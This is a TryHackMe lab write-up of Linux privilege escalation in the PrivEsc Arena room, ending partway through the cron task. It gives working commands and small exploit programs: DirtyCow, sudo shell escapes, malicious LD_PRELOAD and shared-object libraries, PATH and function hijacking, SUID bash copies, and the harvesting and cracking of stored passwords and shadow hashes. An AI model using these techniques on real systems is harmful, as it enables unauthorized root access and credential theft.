# Tryhackme | Linux PrivEsc Arena Challenge

This post is a write-up for the Linux PrivEsc Arena room on THM.
The Linux PrivEsc Arena room consists of 19 tasks in total and is designed for hands-on practice of Linux privilege escalation techniques, including kernel exploits, sudo attacks, SUID attacks, and more.
Detailed information about the room can be found at the link below.
[→ https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
[<br>Linux PrivEsc Arena<br>Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123<br>tryhackme.com](https://tryhackme.com/room/linuxprivescarena)
### \[ Task2 - Deploy the vulnerable machine \]
※Task1 involves connecting to the THM network using OpenVPN, so it will be skipped here.
Since this room focuses on Linux privilege escalation, the process of obtaining SSH credentials appears to be skipped.
Simply connect to SSH using the provided credentials (TCM:Hacker123).
**Command:**
```bash
ssh -p 22 TCM@<IP>
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.png)
If the connection fails using the standard connection command due to version differences between the SSH client and server, it may not connect.
※The latest OpenSSH clients disable the insecure ssh-rsa algorithm by default, causing host key algorithm negotiation to fail with older servers.
In that case, use the HostKeyAlgorithms option as shown below to force the legacy ssh-rsa algorithm to be accepted.
**Command:**
```bash
ssh -o "HostKeyAlgorithms=+ssh-rsa" TCM@<IP>
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.png)
After running the command, you can confirm that the SSH connection was successful as shown in the screenshot.
### \[ Task3 - Privilege Escalation - Kernel Exploits \]
Using the SSH shell obtained in Task2, running the pre-installed linux-exploit-suggester.sh will analyze the current kernel version and display a list of available exploits.
※In a real-world scenario, the exploit tool would not exist on the target machine, so it must be uploaded manually using wget, scp, or a Python web server.
**Command:**
```bash
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/7.png)
The output revealed multiple exploits, and among them, \[CVE-2016-5195\] dirtycow will be used for privilege escalation.
※Dirtycow was chosen from the list because the current system (Debian) falls within the vulnerable range, and it is a reliable and well-verified exploit.
To exploit the Dirtycow vulnerability, the /usr/bin/passwd binary is replaced with a root shell, allowing a regular user to gain root privileges.
※Dirtycow is a Race Condition vulnerability.
**Dirtycow Vulnerability Explained:**
```bash
Race Condition:
A situation where two threads access the same resource simultaneously and produce unintended results due to timing differences.

DirtyCow Explained:
The Linux kernel (including Debian) has a mechanism called Copy-on-Write (CoW).

CoW behavior before patch:
1. When trying to modify a read-only file, the kernel creates a copy for modification.
2. The original file is protected from being modified.

Dirtycow vulnerability principle:
1. Thread 1: Creating a copy.
2. Thread 2: Accessing the original file at that exact moment.
3. If the timing is right, the read-only original file can be modified.

This allows a regular user to overwrite /usr/bin/passwd, which is owned by root.
```
**Command:**
```bash
(1 - Compile exploit code + command function)

gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
#1. c0w.c is just a text file and cannot be executed directly, so it must be compiled with gcc.
#2. The -pthread option enables multithreading, as Dirtycow is a Race Condition-based vulnerability.

(2 - Run exploit + command function)

./c0w
#1. Uses the Dirtycow vulnerability to replace the /usr/bin/passwd binary with a root shell.

(3 - Gain root privileges + command function)

passwd
#1. Since /usr/bin/passwd has been replaced with a root shell, running it will launch the root shell.

(4 - Verify privileges + command function)

id
#1. If uid=0(root) is displayed, privilege escalation was successful.

(5 - Restore + command function)

cp /tmp/bak /usr/bin/passwd
#1. Restores the original passwd backed up in step 2 to return the machine to its original state.
#2. Running this during the process will cause loss of root privileges, so it must be executed after completing all tasks.
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.png)
As a result, root privileges were successfully obtained.
### \[ Task4 - Privilege Escalation - Stored Passwords (Config Files)\]
Having obtained root privileges, the goal of this task is to collect credentials.
Credentials can often be stored in hundreds or thousands of various files such as VPN config files, IRC/chat config files, SSH keys, etc.
For this reason, automated tools are typically used in real scenarios, but in this lab, the file paths containing credentials have been specified in advance, so those files are opened to collect credentials.
**Target files:**
```bash
/home/user/myvpn.ovpn      →   VPN config file; the auth-user-pass field points to the authentication file path.
/etc/openvpn/auth.txt	   →   VPN authentication file storing credentials in plaintext.
/home/user/.irssi/config   →   IRC client config file storing plaintext passwords.
```
**Command:**
```bash
cat /home/user/myvpn.ovpn
#VPN config file
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.png)
**Command:**
```bash
cat /etc/openvpn/auth.txt
#auth-user-pass - authentication file path
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.png)
**Command:**
```bash
cat /home/user/.irssi/config | grep -i passw
#IRC client config file
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.png)
The execution revealed credentials (user:password321) for both the VPN and IRC server.
**Answer:**
```bash
1.What password did you find?
#password321

2.What user's credentials were exposed in the OpenVPN auth file?
#user
```
### \[ Task5 - Privilege Escalation - Stored Passwords (History)\]
In Task5, unlike the previous task, credentials will be searched for in the bash history.
※ bash history = A file where all commands entered in the terminal are automatically saved.
**Command:**
```bash
cat /home/user/.bash_history | grep -i passw
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/13.png)
The execution revealed credentials for the MySQL server.
※If a password is entered directly with the -p option in the MySQL login command, it may be saved in the history.
※ The correct method is to enter only the -p option and input the password separately at the prompt, which prevents the password from being saved in history.
**Answer:**
```bash
1.What was TCM trying to log into?
#mysql

2.Who was TCM trying to log in as?
#root

3.Naughty naughty.  What was the password discovered?
#password123
```
### \[ Task6 - Privilege Escalation - Weak File Permissions\]
※The /etc/shadow file has incorrect permissions set to -rw-rw-r--, making it readable by regular users.
※ The correct permission should be -rw-r----- (640), allowing only root and the shadow group to read it.
The goal of Task6 is to obtain the password hash from the /etc/shadow file and crack it to retrieve the plaintext password.
Additionally, to crack the hash, /etc/passwd and /etc/shadow must be combined using the unshadow tool to produce a format that hashcat can crack.
**Command:**
```bash
(Debian terminal)

ls -la /etc/shadow
# Check file permissions

cat /etc/passwd
# Copy user list and paste into nano passwd.txt on Kali

cat /etc/shadow
# Copy password hashes and paste into nano shadow.txt on Kali

----------------------------------------------

(Kali terminal)

nano passwd.txt
# Paste passwd content, then Ctrl+X → Y → Enter

nano shadow.txt
# Paste shadow content, then Ctrl+X → Y → Enter

unshadow passwd.txt shadow.txt > unshadowed.txt
# Combine the two files

hashcat -m 1800 unshadowed.txt rockyou.txt -O
# Crack the hash
```
**Command**:
```bash
ls -la /etc/shadow
# Check file permissions
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/14.png)
**Command:**
```bash
cat /etc/passwd
# Copy user list and paste into nano passwd.txt on Kali
```
**Result**:
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/15.png)
**Command**:
```bash
cat /etc/shadow
# Copy password hashes and paste into nano shadow.txt on Kali
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/16.png)
**Command:**
```bash
hashcat -m 1800 unshadowed.txt rockyou.txt -O
# Crack the hash
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/17.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/18.png)
The file permission check confirmed that /etc/shadow was set to -rw-rw-r--, making it readable by regular users.
Using this, the password hash was obtained and cracked with hashcat, revealing the plaintext password for the root account: password123.
**Answer:**
```bash
1.What were the file permissions on the /etc/shadow file?
#-rw-rw-r--
```
### \[ Task7 - Privilege Escalation - SSH Keys\]
In Task7, the goal is to find the SSH private key file and use it to log in as root.
The private key (id_rsa) should normally only be readable by its owner, but if permissions are misconfigured, other users can read the key and abuse it for SSH login.
**Command:**
```bash
find / -name authorized_keys 2> /dev/null
#Command to search the entire system for authorized_keys files
#authorized_keys = public key file stored on the server
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/19.png)
The command to find authorized_keys confirmed that the root account uses SSH key authentication.
Having confirmed SSH key authentication is in use, the find command is used to locate the id_rsa file and verify its path.
**Command:**
```bash
find / -name id_rsa 2> /dev/null
#Command to search the entire system for the id_rsa file
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/20.png)
The search found a private key at /backups/supersecretkeys/id_rsa.
The private key is copied to the attacker's machine, and an SSH login attempt is made to the root account.
**Command:**
```bash
cat /backups/supersecretkeys/id_rsa
#Read id_rsa

nano id_rsa
#Paste content, then Ctrl+X → Y → Enter
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/21.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/22.png)
The SSH private key has been copied to the attacker's machine.
Since SSH refuses connections if the private key permissions are too open for security reasons, the permissions must be set with chmod 400.
Then, use the ssh -i option to log in to the root account using the private key without a password.
**Command:**
```bash
chmod 400 id_rsa
#Restrict to owner read-only to prevent connection refusal

ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa root@<IP>
#Allow legacy SSH key type + allow legacy public key algorithm
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/23.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/24.png)
The result confirmed a successful login to the root account using only the private key without a password.
**Answer:**
```bash
1.What's the full file path of the sensitive file you discovered?
#/backups/supersecretkeys/id_rsa
```
### \[ Task8 - Privilege Escalation - Sudo (Shell Escaping)\]
In Task8, the goal is to obtain a root shell by exploiting misconfigured sudo commands.
**Command:**
```bash
sudo -l
# Check the list of commands executable with sudo
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/25.png)
The command output displayed the list of commands executable with sudo.
The list from iftop to more contains commands that can be abused for sudo privilege escalation, but in this task, find, awk, vim, and nmap are used to execute a shell.
**Command (find):**
```bash
sudo find /bin -name nano -exec /bin/sh \;
# Execute root shell using find's -exec option
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/26.png)
※Root shell successfully obtained
**Command (awk):**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
# Execute root shell using awk's system() function
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/27.png)
※Root shell successfully obtained
**Command (vim):**
```bash
sudo vim -c '!sh'
# Execute root shell using vim's internal command
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/28.png)
※Root shell successfully obtained
**Command (nmap):**
```bash
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
# Execute root shell using nmap's scripting feature
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/29.png)
※Root shell successfully obtained
### \[ Task9 - Privilege Escalation - Sudo (Abusing Intended Functionality)\]
In this task, apache2 from the sudo list confirmed in the previous task is used.
The goal is to read the /etc/shadow file using apache2's -f option to obtain the root password hash, then crack it with john.
※ This exploits the fact that apache2 mistakenly reads the shadow file as a configuration file and outputs its contents as error messages.
**Command:**
```bash
sudo apache2 -f /etc/shadow
# apache2 reads the shadow file and outputs the root hash along with an error
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/30.png)
The command output included the root hash within the error message.
Next, saving the hash to a file and cracking it will yield the root credentials.
**Command:**
```bash
echo 'hash' > hash.txt
# Save hash to file

john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
# Crack the hash
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/31.png)
The cracking result confirmed that the root account's password is password123.
### \[ Task10 - Privilege Escalation - Sudo (LD_PRELOAD)\]
In Task10, the goal is to obtain a root shell using the LD_PRELOAD environment variable.
Due to the env_keep+=LD_PRELOAD setting displayed when sudo -l was run in Task8, LD_PRELOAD is preserved even when running sudo. This is abused to load a malicious library with root privileges first.
※ LD_PRELOAD = An environment variable that loads a specific library before a program executes.
**Write x.c file (malicious file):**
```bash
nano x.c
#Create file

(Malicious code)
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
**Compile and Execute:**
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
# Compile x.c as a shared library (.so)
# -fPIC = Generate position-independent code (required for shared libraries)
# -shared = Compile as a shared library
# -nostartfiles = Exclude standard startup files (no main function needed for a library)

sudo LD_PRELOAD=/tmp/x.so apache2
# Specify the malicious library in LD_PRELOAD and execute apache2 with sudo
# x.so is loaded before apache2 executes, launching the root shell

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/32.png)
The execution successfully obtained a root shell.
### \[ Task11 - Privilege Escalation - SUID (Shared Object Injection)
In Task11, the goal is to obtain a root shell by exploiting a vulnerability in a SUID binary.
When a SUID binary executes and attempts to load a specific library, if that library does not exist, placing a malicious library in its path causes it to be executed with SUID privileges (root), resulting in a root shell.
※ SUID (Set User ID) = A special permission that executes a file with the privileges of the file's owner.
**Command:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# Check the full list of SUID binaries
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/33.png)
The command output displayed the list of SUID binaries.
Next, after checking the SUID binary list, strace is used to trace which libraries the suid-so binary attempts to load on execution.
※In a real-world scenario, the full list of SUID binaries must be checked, but in this lab, only the normally matched /usr/bin/sudo and the vulnerable suid-so are analyzed for comparison.
**Command:**
```bash
strace <SUID path> 2>&1 | grep -i -E "open|access|no such file"
# Check the libraries the SUID binary attempts to load on execution
# open("path") = 3            → File found successfully
# open("path") = -1 ENOENT    → The library the binary is trying to load does not exist (vulnerability)
# access("path") = -1 ENOENT  → This is an optional check file and can be ignored

ls -la <parent directory of the missing library>
# Check if the path is writable
# drwxrwxrwx or owned by current user → writable
# drwxr-xr-x 	 → only owner can write
```
**Result (normal binary):**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/34.png)
**Result (abnormal binary):**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/35.png)
In the strace results, entries starting with open that display ENOENT indicate that the library the binary is trying to load does not exist.
Since the directory is writable, placing a malicious library at that path will cause it to be loaded when suid-so is executed, resulting in a root shell.
**Command:**
```bash
mkdir /home/user/.config
# Create directory matching the path found in strace

cd /home/user/.config
# Move to the created directory

nano libcalc.c
# Write malicious library code

(Malicious code)
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
#Copy bash to /tmp/bash, set SUID → execute root shell

gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
# Compile the malicious library

/usr/local/bin/suid-so
# Load the malicious library when suid-so is executed

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/36.png)
The execution successfully obtained a root shell.
### \[ Task12 - Privilege Escalation - SUID (symlinks)\]
In Task12, the goal is to obtain root privileges by exploiting the logrotate vulnerability in an older version of nginx.
logrotate is a program that automatically compresses/replaces log files when they grow too large. Versions below nginx 1.6.2-5+deb8u3 are vulnerable to symlink attacks, allowing privilege escalation from www-data to root.
※ The Log Rotation attack requires two shell sessions on the same server.
**Command (Terminal 1 - SSH session):**
```bash
dpkg -l | grep nginx
# Check nginx version (vulnerable if below 1.6.2-5+deb8u3)

su root
# Password: password123
# In a real scenario, www-data access would be obtained via a web server vulnerability,
# but in this lab, we switch to www-data via root for simulation purposes.

su -l www-data
# Switch to www-data (needed for nginx log file manipulation)

/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
# Run exploit and wait for logrotate
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/37.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/38.png)
uid = actual logged-in user, euid = current execution privileges
**Command (Terminal 2 - SSH session):**
```bash
su root
# Switch to root (password: password123)

invoke-rc.d nginx rotate >/dev/null 2>&1
# Force logrotate execution → triggers exploit in Terminal 1
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/39.png)
The execution confirmed euid = 0, indicating successful root privilege acquisition.
**Answer:**
```bash
1.What CVE is being exploited in this task?
#CVE-2016-1247

2.What binary is SUID enabled and assists in the attack?
#sudo
```
### \[ Task13 - Privilege Escalation - SUID (Enviroment Variables #1)\]
In Task13, the goal is to obtain root privileges by manipulating the PATH environment variable when a SUID binary executes commands without using an absolute path.
The existing suid-env binary internally calls the service command without an absolute path.
When Linux executes a command, it searches the directories registered in the PATH environment variable in order, and if called without an absolute path, it executes the first matching file found in PATH.
Therefore, by prepending /tmp to PATH and placing a malicious file named service in /tmp that executes a root shell, running suid-env will cause the malicious service to be executed with SUID privileges (root), resulting in a root shell.
**Command:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# Check the SUID binary list

strings /usr/local/bin/suid-env
# Check what commands suid-env calls internally
# Identify commands called without an absolute path
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/40.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/41.png)
The command output in the second screenshot shows that service is called without an absolute path.
This means the PATH environment variable can be manipulated to execute a malicious service file first.
Therefore, a malicious service file that executes a root shell is placed in /tmp, and /tmp is prepended to PATH so that when suid-env runs, the malicious service is executed with root privileges.
**Command:**
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
# Write malicious service code in /tmp

gcc /tmp/service.c -o /tmp/service
# Compile the malicious service

export PATH=/tmp:$PATH
# Prepend /tmp to PATH → /tmp is searched first when looking for service

/usr/local/bin/suid-env
# Run suid-env → load /tmp/service → obtain root shell

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/42.png)
The execution resulted in full root privileges.
※euid = 0 means execution privileges only, uid = 0 means full root privileges.
**Answer:**
```bash
1.What is the last line of the strings /usr/local/bin/suid-env output?
#service apache2 start
```
### \[ Task14 - Privilege Escalation - SUID (Enviroment Variables #2) \]
In Task14, unlike Task13, suid-env2 calls service using an absolute path (/usr/sbin/service), making PATH manipulation impossible.
Therefore, two different methods are used to obtain a root shell.
**Command:**
```bash
find / -type f -perm -04000 -ls 2>/dev/null
# Check the SUID binary list

strings /usr/local/bin/suid-env2
# Check what commands suid-env2 calls internally
# Verify whether an absolute path is used
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/43.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/44.png)
The command output confirms that, unlike the previous task, an absolute path is specified.
Since PATH manipulation is not possible, two methods are used to obtain a root shell: function overwriting and bash debug mode.
**Command (Method 1 - Function Overwriting):**
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
# Create a function named /usr/sbin/service
# Linux execution priority: function → alias → file
# If a function with the same name exists, it is executed before the actual file

export -f /usr/sbin/service
# Pass the created function to child processes (suid-env2) as well
# Without export -f, suid-env2 will not recognize the function

/usr/local/bin/suid-env2
# Run suid-env2 → calls /usr/sbin/service → our function executes → root shell obtained

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/45.png)
The command execution resulted in full root privileges (uid + euid).
**Command (Method 2 - bash debug mode):**
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
# Use bash debug mode (xtrace) to inject malicious code before command execution

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/46.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/47.png)
The command execution obtained root execution privileges (euid).
**Answer:**
```bash
1.What is the last line of the strings output?
#/usr/sbin/service apache2 start
```
### \[ Task15 - Privilege Escalation - Capabilities\]
In Task15, the goal is to obtain a root shell using Linux Capabilities.
It is assumed that an administrator has granted cap_setuid to python2.6.
Since cap_setuid allows changing the UID, calling os.setuid(0) in Python can change the UID to root (0).
Once the UID becomes 0, full root privileges are granted, so executing /bin/bash afterward will obtain a root shell.
※ Capabilities is a feature that breaks down root privileges into granular permissions, allowing only the necessary permissions to be selectively granted.
**Command:**
```bash
getcap -r / 2>/dev/null
# Check all files with capabilities set across the entire system
# Identify the path of the file with cap_setuid permission

<path of the file with cap_setuid+ep from getcap results> -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Run using the Python path with cap_setuid+ep from getcap results
# os.setuid(0) → change uid to root (0)
# os.system("/bin/bash") → execute root shell

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/48.png)
The execution successfully obtained a root shell.
### \[ Task16 - Privilege Escalation - Cron (Path) \]
In Task16, the goal is to obtain root privileges by exploiting the Path vulnerability in a Cron Job.
A Cron Job is a scheduled task that runs automatically at specific intervals.
If a writable path exists in the Crontab PATH, and a file with the same name as the script that cron is set to execute can be placed there, cron will run the malicious script with root privileges, resulting in a root shell.
**Command:**
```bash
cat /etc/crontab
# Check cron configuration
# Check the PATH variable
# Identify which scripts are executed
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/49.png)
Since /home/user is in the PATH, it is writable with regular user privileges.
Next, writing a malicious script and granting execute permission means that overwrite.sh, which runs every minute with root privileges, will find /home/user/overwrite.sh first during PATH lookup and execute the malicious script with root privileges.
**Command:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
# Write malicious overwrite.sh in /home/user
# cron finds /home/user/overwrite.sh first during PATH lookup

chmod +x /home/user/overwrite.sh
# Grant execute permission

# Wait 1 minute

/tmp/bash -p
# Execute SUID-enabled bash → root shell

id
# Verify root privileges
```
**Result:**
